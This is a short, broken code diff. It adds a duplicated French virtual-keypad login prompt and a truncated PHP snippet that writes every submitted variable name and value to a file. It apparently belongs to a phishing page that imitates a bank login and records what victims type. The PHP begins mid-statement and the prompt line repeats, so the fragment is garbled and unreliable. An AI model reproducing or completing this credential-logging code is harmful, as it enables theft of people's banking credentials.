@@ -1,0 +1,13 @@
+Veuillez saisir votre identifiant grâce aux touches ci-dessous :
+Veuillez saisir votre identifiant grâce aux touches ci-dessous :
+$bilsmg) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $bilsmg);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+}
+?>
